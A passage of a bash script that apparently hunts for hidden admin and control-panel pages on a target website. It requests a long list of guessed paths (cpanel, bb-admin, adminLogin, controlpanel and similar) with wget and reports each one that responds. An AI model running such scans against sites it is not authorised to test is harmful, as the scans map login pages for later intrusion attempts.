if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitem.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitem"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitems.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitems.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminitems"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin-login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adminLogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/affiliate.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/auth.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/auth.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authenticate.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authenticate.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authentication.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authentication.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authuser.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/authuser.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/autologin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/autologin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/autologin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/backoffice"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/banneradmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bbadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/bb-admin/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/bb-admin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bb-admin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/bigadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/blogindex"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cadmins"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ccp14admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/cgi-bin/loginasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cgi-bin/loginphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/check.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/check.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checkadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checkadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checklogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checklogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checkuser.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/checkuser.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Clave"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cmsadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cmsadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cmsadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/config"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/control.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/control.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/control"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controle"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controles"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/controlpanel.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cPanel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cpanel_file"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/customer_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/database_administration"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/directadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/dir-login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/donos"
